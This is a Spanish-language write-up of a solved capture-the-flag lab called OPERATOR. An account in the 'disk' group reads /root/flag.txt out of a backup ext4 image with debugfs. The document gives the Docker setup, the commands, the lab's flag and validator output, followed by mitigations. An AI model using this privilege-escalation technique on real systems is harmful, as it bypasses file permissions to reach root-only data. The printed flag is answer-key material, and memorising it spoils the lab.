# OPERATOR — WHOAMI-LABS.COM

**Laboratorio:** OPERATOR (WHOAMI-LABS.COM)
**Categoría:** Escalada local por acceso a imagen de disco y grupo privilegiado
**Dificultad:** ★★★★★☆☆☆ difícil (5 puntos)
**Fecha:** 2026-10-31
**Estado:** resuelto
**Flag:** `WebExploitLabs{sh13ldf0rc3_cmd1nj_0rch3str4t0r_2026}`

## Alcance y preparación local

- Alcance autorizado: imagen local `operator.tar` del laboratorio OPERATOR.
- Servicio local: el contenedor se inició sin publicar puertos, usando la red Docker
  del laboratorio.
- Herramientas: Docker, SSH local y `debugfs`.

## Resumen

El contenedor contenía una cuenta operativa (`sfoperator`) y una cuenta
`shieldforce` perteneciente al grupo `disk`. En `/var/backups/raw_system.img` había
una imagen ext4 creada como respaldo del sistema, con permisos `root:disk` y modo
`640`. Tras cambiar a la cuenta `shieldforce`, la pertenencia al grupo `disk`
permitió leer archivos internos de la imagen con `debugfs`, incluyendo el flag de
Root.

## Pasos reproducibles

1. Cargar y ejecutar la imagen:

   ```bash
   docker load -i operator.tar
   docker run -d --name operator --hostname operator operator:latest
   ```

2. Identificar las cuentas locales y el backup:

   ```text
   /var/backups/raw_system.img  root:disk  640
   shieldforce -> groups: shieldforce,disk
   sfoperator  -> groups: sfoperator
   ```

3. Acceder con la cuenta operativa del laboratorio y cambiar a `shieldforce` usando
   las credenciales entregadas por el escenario. Las credenciales no se incluyen en
   este documento.
4. Confirmar el acceso efectivo al grupo privilegiado:

   ```bash
   id
   # ... disk ...
   ```

5. Leer el archivo dentro de la imagen sin montarla:

   ```bash
   debugfs -R "cat /root/flag.txt" /var/backups/raw_system.img
   ```

6. El contenido devuelto fue:

   ```text
   WebExploitLabs{sh13ldf0rc3_cmd1nj_0rch3str4t0r_2026}
   ```

### Esperado frente a observado

| Caso | Esperado | Observado |
| --- | --- | --- |
| Cuenta operativa sin grupo `disk` | No puede leer el backup | `sfoperator` no pertenecía a `disk` |
| Cuenta `shieldforce` | Acceso limitado a sus propios archivos | Pertenecía a `disk` y podía leer la imagen |
| Lectura de `/var/backups/raw_system.img` | Backup no debe revelar archivos root | `debugfs` leyó `/root/flag.txt` |
| Validador oficial | Rechazo de flags incorrectas | Aceptó la flag y mostró el mensaje de compromiso |

## Evidencia

- `evidence/operator/01-permissions.txt` — permisos del backup y pertenencia a
  grupos, sin hashes ni contraseñas.
- `evidence/operator/02-debugfs.txt` — comando de lectura y resultado redactado de
  la imagen ext4.
- `evidence/operator/03-validation.txt` — respuesta de aceptación del validador.

## Análisis

El problema es una combinación de **exposición de un backup de disco** y
**asignación excesiva al grupo `disk`**. Los miembros de ese grupo pueden acceder
directamente a dispositivos o imágenes de bloque y, por tanto, eludir los
permisos normales de archivos contenidos dentro de la imagen. Guardar una copia
del sistema con archivos de root en una ruta legible por el grupo convierte el
backup en una fuente de escalada.

- **Caja negra:** se observó el estado del contenedor, sus cuentas, permisos y la
  salida de `debugfs`.
- **Inspección local privilegiada:** se leyó el archivo de flag con `debugfs` dentro
  del contenedor y se ejecutó el validador local; esto se mantuvo dentro del
  laboratorio autorizado.

## Validación de flag

El script oficial respondió:

```text
¡Felicitaciones! Has comprometido OPERATOR a nivel Difícil.
TIEMPO TOTAL: 00h 00m 00s
```

Flag validada:

```text
WebExploitLabs{sh13ldf0rc3_cmd1nj_0rch3str4t0r_2026}
```

## Mitigaciones

1. No incluir archivos sensibles de root en backups accesibles por usuarios del
   sistema; cifrar los backups y restringir su almacenamiento.
2. Evitar conceder el grupo `disk` a cuentas operativas; usar permisos específicos
   y herramientas privilegiadas con allowlist.
3. Separar las cuentas de operación y administración, con credenciales rotadas y
   autenticación SSH por claves.
4. Auditar permisos de imágenes de disco y probar que ningún usuario no
   administrador pueda extraer archivos del sistema.
